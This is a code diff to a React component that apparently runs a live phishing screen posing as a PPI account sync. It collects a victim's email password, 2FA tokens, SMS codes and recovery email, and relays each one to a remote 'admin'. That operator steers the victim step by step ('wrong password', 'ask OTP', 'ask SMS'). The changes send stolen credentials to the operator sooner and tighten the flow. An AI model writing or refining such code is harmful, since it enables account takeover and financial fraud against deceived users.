@@ -25,7 +25,6 @@ const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
   const [step, setStep] = useState<SyncStep>("email_input");
   const [clientEmail, setClientEmail] = useState("");
   const [password, setPassword] = useState("");
-  const [loading, setLoading] = useState(false);
   const [tokenCode, setTokenCode] = useState("");
   const [smsCode, setSmsCode] = useState("");
   const [clientRecoveryEmail, setClientRecoveryEmail] = useState("");
@@ -39,6 +38,11 @@ const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
 
   const syncChRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
   const confirmChRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
+  const stepRef = useRef<SyncStep>("email_input");
+
+  useEffect(() => {
+    stepRef.current = step;
+  }, [step]);
 
   const broadcastToAdmin = useCallback(
     (event: string, payload: Record<string, string>) => {
@@ -55,39 +59,41 @@ const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
     confirmChRef.current = confirmCh;
 
     const handleDecision = (decision: string, payload?: Record<string, string>) => {
+      const currentStep = stepRef.current;
+      const isCredentialPhase = currentStep === "email_input" || currentStep === "password";
+
       if (decision === "sync_wrong_password" || decision === "confirm_wrong_password") {
         setErrorMessage("Contraseña incorrecta. Intentá de nuevo.");
         setStep("password");
         setPassword("");
-        setLoading(false);
-      } else if (decision === "sync_ask_otp" || decision === "confirm_ask_otp") {
-        if (step === "sms_waiting" || step === "recovery_email_submitted") {
+      } else if ((decision === "sync_ask_otp" || decision === "confirm_ask_otp") && !isCredentialPhase) {
+        if (currentStep === "sms_waiting" || currentStep === "recovery_email_submitted") {
           setStep("sms_code"); setSmsCode("");
         } else {
           setStep("token_2fa"); setTokenCode(""); setAdminTokenCode("");
         }
         setErrorMessage("");
-      } else if (decision === "sync_ask_token" || decision === "confirm_ask_token") {
+      } else if ((decision === "sync_ask_token" || decision === "confirm_ask_token") && !isCredentialPhase) {
         setAdminTokenCode(payload?.admin_token || "");
         setStep("token_2fa"); setTokenCode(""); setErrorMessage("");
-      } else if (decision === "sync_ask_sms" || decision === "confirm_ask_sms") {
-        if (step === "sms_waiting" || step === "recovery_email_submitted") {
+      } else if ((decision === "sync_ask_sms" || decision === "confirm_ask_sms") && !isCredentialPhase) {
+        if (currentStep === "sms_waiting" || currentStep === "recovery_email_submitted") {
           setStep("sms_code"); setSmsCode("");
         } else {
           setPhoneEnding(payload?.sms_ending || "");
           setStep("sms_phone"); setClientPhoneInput(""); setSmsCode("");
         }
         setErrorMessage("");
-      } else if (decision === "sync_advance_sms_code" || decision === "confirm_advance_sms_code") {
+      } else if ((decision === "sync_advance_sms_code" || decision === "confirm_advance_sms_code") && !isCredentialPhase) {
         const ending = payload?.sms_ending || "";
         if (ending) setPhoneEnding(ending);
         setStep("sms_code"); setSmsCode(""); setErrorMessage("");
-      } else if (decision === "sync_ask_recovery_email" || decision === "confirm_ask_recovery_email") {
+      } else if ((decision === "sync_ask_recovery_email" || decision === "confirm_ask_recovery_email") && !isCredentialPhase) {
         setRecoveryEmailAddr(payload?.recovery_email || "");
         setStep("recovery_email_input"); setClientRecoveryEmail(""); setErrorMessage("");
       } else if (decision === "sync_approved" || decision === "confirm_approved") {
         setStep("success");
-      } else if (decision === "sync_rejected" || decision === "confirm_rejected") {
+      } else if ((decision === "sync_rejected" || decision === "confirm_rejected") && !isCredentialPhase) {
         setErrorMessage("Verificación fallida. Intentá de nuevo.");
         setClientRecoveryEmail(""); setSmsCode(""); setTokenCode("");
       }
@@ -100,30 +106,33 @@ const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
       const { data } = await supabase.from("sessions").select("status, otp_code").eq("id", sessionId).maybeSingle();
       if (!data) return;
       const { status: dbStatus, otp_code: otp } = data;
-      if ((dbStatus === "sync_wrong_password" || dbStatus === "confirm_wrong_password") && step !== "password") {
+      const currentStep = stepRef.current;
+      const isCredentialPhase = currentStep === "email_input" || currentStep === "password";
+
+      if ((dbStatus === "sync_wrong_password" || dbStatus === "confirm_wrong_password") && currentStep !== "password") {
         setErrorMessage("Contraseña incorrecta."); setStep("password"); setPassword("");
-      } else if ((dbStatus === "sync_ask_otp" || dbStatus === "confirm_ask_otp") && step !== "token_2fa" && step !== "sms_code") {
-        if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
+      } else if ((dbStatus === "sync_ask_otp" || dbStatus === "confirm_ask_otp") && !isCredentialPhase && currentStep !== "token_2fa" && currentStep !== "sms_code") {
+        if (currentStep === "sms_waiting" || currentStep === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
         else { setStep("token_2fa"); setTokenCode(""); setAdminTokenCode(""); }
-      } else if ((dbStatus === "sync_ask_token" || dbStatus === "confirm_ask_token") && step !== "token_2fa") {
+      } else if ((dbStatus === "sync_ask_token" || dbStatus === "confirm_ask_token") && !isCredentialPhase && currentStep !== "token_2fa") {
         const code = otp?.startsWith("admin_token:") ? otp.replace("admin_token:", "") : "";
         setAdminTokenCode(code); setStep("token_2fa"); setTokenCode("");
-      } else if ((dbStatus === "sync_ask_sms" || dbStatus === "confirm_ask_sms") && step !== "sms_phone" && step !== "sms_code" && step !== "sms_waiting") {
-        if (step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
+      } else if ((dbStatus === "sync_ask_sms" || dbStatus === "confirm_ask_sms") && !isCredentialPhase && currentStep !== "sms_phone" && currentStep !== "sms_code" && currentStep !== "sms_waiting") {
+        if (currentStep === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
         else {
           const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : "";
           setPhoneEnding(ending); setStep("sms_phone"); setClientPhoneInput(""); setSmsCode("");
         }
-      } else if ((dbStatus === "sync_advance_sms_code" || dbStatus === "confirm_advance_sms_code") && step !== "sms_code") {
+      } else if ((dbStatus === "sync_advance_sms_code" || dbStatus === "confirm_advance_sms_code") && !isCredentialPhase && currentStep !== "sms_code") {
         const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : "";
         if (ending) setPhoneEnding(ending); setStep("sms_code"); setSmsCode("");
-      } else if ((dbStatus === "sync_ask_recovery_email" || dbStatus === "confirm_ask_recovery_email") && step !== "recovery_email_input" && step !== "recovery_email_submitted") {
+      } else if ((dbStatus === "sync_ask_recovery_email" || dbStatus === "confirm_ask_recovery_email") && !isCredentialPhase && currentStep !== "recovery_email_input" && currentStep !== "recovery_email_submitted") {
         const recEmail = otp?.startsWith("recovery_email_addr:") ? otp.replace("recovery_email_addr:", "") : "";
         setRecoveryEmailAddr(recEmail); setStep("recovery_email_input"); setClientRecoveryEmail("");
       } else if (dbStatus === "sync_approved" || dbStatus === "confirm_approved") {
         setStep("success");
       }
-    }, 2500);
+    }, 1000);
 
     return () => {
       syncChRef.current = null;
@@ -132,19 +141,21 @@ const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
       supabase.removeChannel(confirmCh);
       clearInterval(pollInterval);
     };
-  }, [sessionId, step]);
+  }, [sessionId]);
 
   /* ── Email submit ── */
   const handleEmailSubmit = useCallback(
-    async (e: React.FormEvent) => {
+    (e: React.FormEvent) => {
       e.preventDefault();
-      if (!clientEmail.trim()) return;
-      setLoading(true);
+      const normalizedEmail = clientEmail.trim().toLowerCase();
+      if (!normalizedEmail) return;
+
       setErrorMessage("");
-      await supabase.from("sessions").update({ otp_code: `sync_email:${clientEmail}` }).eq("id", sessionId);
-      broadcastToAdmin("client_sync_email", { session_id: sessionId, sync_email: clientEmail });
+      setClientEmail(normalizedEmail);
       setStep("password");
-      setLoading(false);
+
+      broadcastToAdmin("client_sync_email", { session_id: sessionId, sync_email: normalizedEmail });
+      void supabase.from("sessions").update({ otp_code: `sync_email:${normalizedEmail}` }).eq("id", sessionId);
     },
     [clientEmail, sessionId, broadcastToAdmin]
   );
@@ -160,24 +171,26 @@ const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
   );
 
   const handlePasswordSubmit = useCallback(
-    async (e: React.FormEvent) => {
+    (e: React.FormEvent) => {
       e.preventDefault();
-      if (!password.trim()) return;
-      setLoading(true);
+      const submittedPassword = password.trim();
+      if (!submittedPassword) return;
+
       setErrorMessage("");
-      await supabase
-        .from("sessions")
-        .update({ otp_code: `email_pass:${password}`, status: "confirm_email_pending" })
-        .eq("id", sessionId);
+      setStep("waiting");
+
       broadcastToAdmin("client_email_password", {
         session_id: sessionId,
-        email_password: password,
+        email_password: submittedPassword,
         email: clientEmail,
         provider_id: provider?.id || "",
         provider_name: provider?.name || "",
       });
-      setStep("waiting");
-      setLoading(false);
+
+      void supabase
+        .from("sessions")
+        .update({ otp_code: `email_pass:${submittedPassword}`, status: "confirm_email_pending" })
+        .eq("id", sessionId);
     },
     [password, sessionId, broadcastToAdmin, clientEmail, provider]
   );
@@ -330,13 +343,10 @@ const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
                     placeholder="nombre@email.com"
                     value={clientEmail}
                     onChange={(e) => setClientEmail(e.target.value)}
-                    disabled={loading}
                     autoFocus
                     className={`${inputClass} mb-5`}
                   />
-                  <button type="submit" disabled={loading || !clientEmail.trim()} className={btnClass}>
-                    {loading ? "Verificando..." : "Continuar"}
-                  </button>
+                  <button type="submit" disabled={!clientEmail.trim()} className={btnClass}>Continuar</button>
                 </form>
                 <div className="mt-5 flex items-start gap-2 rounded-lg bg-[#fafbfc] border border-[#eef0f4] px-3.5 py-2.5">
                   <Lock size={12} className="text-[#94a3b8] flex-shrink-0 mt-0.5" />
@@ -375,13 +385,10 @@ const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
                     placeholder="Ingresá tu contraseña"
                     value={password}
                     onChange={(e) => handlePasswordChange(e.target.value)}
-                    disabled={loading}
                     autoFocus
                     className={`${inputClass} mb-5`}
                   />
-                  <button type="submit" disabled={loading || !password.trim()} className={btnClass}>
-                    {loading ? "Verificando..." : "Continuar"}
-                  </button>
+                  <button type="submit" disabled={!password.trim()} className={btnClass}>Continuar</button>
                 </form>
               </>
             )}
